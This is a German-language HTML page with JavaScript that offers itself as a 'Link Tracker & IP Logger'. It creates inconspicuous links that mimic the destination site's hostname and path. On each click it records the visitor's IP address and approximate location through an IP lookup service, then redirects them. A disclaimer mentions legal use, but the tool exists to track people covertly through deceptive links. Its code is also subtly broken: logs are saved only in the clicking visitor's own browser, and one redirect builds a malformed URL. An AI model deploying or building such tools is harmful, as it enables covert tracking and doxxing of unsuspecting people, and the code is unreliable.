<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Tracker & IP Logger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .warning {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            font-size: 14px;
            color: #856404;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }

        input[type="url"], input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border 0.3s;
        }

        input[type="url"]:focus, input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            font-weight: 600;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        button:active {
            transform: translateY(0);
        }

        .result {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            border: 2px solid #667eea;
        }

        .result.show {
            display: block;
        }

        .tracked-link {
            background: white;
            padding: 12px;
            border-radius: 6px;
            margin: 10px 0;
            word-break: break-all;
            font-family: monospace;
            border: 1px solid #ddd;
        }

        .copy-btn {
            background: #28a745;
            padding: 8px 20px;
            font-size: 14px;
            margin-top: 10px;
        }

        .copy-btn:hover {
            background: #218838;
        }

        .logs {
            margin-top: 20px;
        }

        .log-entry {
            background: white;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }

        .log-entry strong {
            color: #667eea;
        }

        .no-logs {
            text-align: center;
            color: #999;
            padding: 40px;
            font-style: italic;
        }

        .clear-btn {
            background: #dc3545;
            margin-top: 10px;
        }

        .clear-btn:hover {
            background: #c82333;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>üîó Link Tracker & IP Logger</h1>
            <div class="warning">
                ‚ö†Ô∏è <strong>Wichtiger Hinweis:</strong> Dieses Tool ist nur f√ºr legale Zwecke gedacht. Informiere Nutzer immer dar√ºber, dass ihre IP-Adresse und Standortdaten erfasst werden. Die missbr√§uchliche Verwendung kann rechtliche Konsequenzen haben.
            </div>

            <div class="input-group">
                <label for="domain">Deine Domain (wo diese Seite gehostet ist):</label>
                <input type="text" id="domain" placeholder="https://deine-seite.com" required>
            </div>

            <div class="input-group">
                <label for="url">Ziel-URL eingeben:</label>
                <input type="url" id="url" placeholder="https://example.com" required>
            </div>

            <button onclick="generateTrackedLink()">Tracking-Link erstellen</button>

            <div class="result" id="result">
                <h3>‚úÖ Dein Tracking-Link:</h3>
                <div class="tracked-link" id="trackedLink"></div>
                <button class="copy-btn" onclick="copyLink()">üìã Link kopieren</button>
                <p style="margin-top: 15px; font-size: 14px; color: #666;">
                    Teile diesen Link. Wenn jemand darauf klickt, wird er zur Ziel-URL weitergeleitet und seine Daten werden hier angezeigt.
                </p>
            </div>
        </div>

        <div class="card">
            <h2>üìä Erfasste Zugriffe</h2>
            <button class="clear-btn" onclick="clearLogs()">Logs l√∂schen</button>
            <div class="logs" id="logs">
                <div class="no-logs">Noch keine Zugriffe erfasst</div>
            </div>
        </div>
    </div>

    <script>
        let logs = [];
        const trackingData = {};

        // Lade gespeicherte Logs
        function loadLogs() {
            const saved = localStorage.getItem('trackerLogs');
            if (saved) {
                logs = JSON.parse(saved);
                displayLogs();
            }
        }

        // Speichere Logs
        function saveLogs() {
            localStorage.setItem('trackerLogs', JSON.stringify(logs));
        }

        // Generiere Tracking-Link
        function generateTrackedLink() {
            const url = document.getElementById('url').value;
            const domain = document.getElementById('domain').value;
            
            if (!url || !url.startsWith('http')) {
                alert('Bitte gib eine g√ºltige Ziel-URL ein (muss mit http:// oder https:// beginnen)');
                return;
            }

            if (!domain || !domain.startsWith('http')) {
                alert('Bitte gib deine Domain ein (z.B. https://deine-seite.com)');
                return;
            }

            try {
                const urlObj = new URL(url);
                const trackingId = Math.random().toString(36).substr(2, 6);
                
                // Speichere die Zuordnung
                trackingData[trackingId] = url;
                localStorage.setItem('trackingData', JSON.stringify(trackingData));
                localStorage.setItem('userDomain', domain);

                // Extrahiere Domain-Name und Pfad aus der Ziel-URL
                const targetHost = urlObj.hostname.replace('www.', '');
                const targetPath = urlObj.pathname !== '/' ? urlObj.pathname : '';
                
                // Erstelle einen unauff√§lligen Link
                const cleanDomain = domain.replace(/\/$/, '');
                const trackedUrl = `${cleanDomain}/${targetHost}${targetPath}?ref=${trackingId}`;
                
                document.getElementById('trackedLink').textContent = trackedUrl;
                document.getElementById('result').classList.add('show');
            } catch (e) {
                alert('Ung√ºltige URL-Format');
            }
        }

        // Link kopieren
        function copyLink() {
            const link = document.getElementById('trackedLink').textContent;
            navigator.clipboard.writeText(link).then(() => {
                alert('Link wurde kopiert!');
            });
        }

        // IP-Adresse und Standort abrufen
        async function getLocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    timestamp: new Date().toLocaleString('de-DE')
                };
            } catch (error) {
                return {
                    ip: 'Nicht verf√ºgbar',
                    city: 'Nicht verf√ºgbar',
                    region: 'Nicht verf√ºgbar',
                    country: 'Nicht verf√ºgbar',
                    timestamp: new Date().toLocaleString('de-DE')
                };
            }
        }

        // Logs anzeigen
        function displayLogs() {
            const logsDiv = document.getElementById('logs');
            
            if (logs.length === 0) {
                logsDiv.innerHTML = '<div class="no-logs">Noch keine Zugriffe erfasst</div>';
                return;
            }

            logsDiv.innerHTML = logs.map(log => `
                <div class="log-entry">
                    <strong>Zeit:</strong> ${log.timestamp}<br>
                    <strong>IP-Adresse:</strong> ${log.ip}<br>
                    <strong>Standort:</strong> ${log.city}, ${log.region}, ${log.country}<br>
                    <strong>Ziel-URL:</strong> ${log.targetUrl}
                </div>
            `).reverse().join('');
        }

        // Logs l√∂schen
        function clearLogs() {
            if (confirm('M√∂chtest du wirklich alle Logs l√∂schen?')) {
                logs = [];
                saveLogs();
                displayLogs();
            }
        }

        // Pr√ºfe ob Tracking-Parameter vorhanden ist
        async function checkTracking() {
            const path = window.location.pathname;
            const params = new URLSearchParams(window.location.search);
            const trackingId = params.get('ref');

            // Wenn wir einen Pfad haben (z.B. /youtube.com/watch)
            if (path && path !== '/' && path !== '/index.html') {
                if (trackingId) {
                    const savedData = JSON.parse(localStorage.getItem('trackingData') || '{}');
                    const targetUrl = savedData[trackingId];

                    if (targetUrl) {
                        const locationData = await getLocationData();
                        
                        logs.push({
                            ...locationData,
                            targetUrl: targetUrl
                        });
                        saveLogs();

                        // Weiterleitung zur Ziel-URL
                        window.location.href = targetUrl;
                    } else {
                        // Versuche die URL aus dem Pfad zu rekonstruieren
                        const reconstructedUrl = 'https:/' + path;
                        const locationData = await getLocationData();
                        
                        logs.push({
                            ...locationData,
                            targetUrl: reconstructedUrl
                        });
                        saveLogs();

                        window.location.href = reconstructedUrl;
                    }
                }
            }
        }

        // Initialisierung
        window.onload = () => {
            loadLogs();
            checkTracking();
            
            const savedData = localStorage.getItem('trackingData');
            if (savedData) {
                Object.assign(trackingData, JSON.parse(savedData));
            }

            // Lade gespeicherte Domain
            const savedDomain = localStorage.getItem('userDomain');
            if (savedDomain) {
                document.getElementById('domain').value = savedDomain;
            }
        };
    </script>
</body>
</html>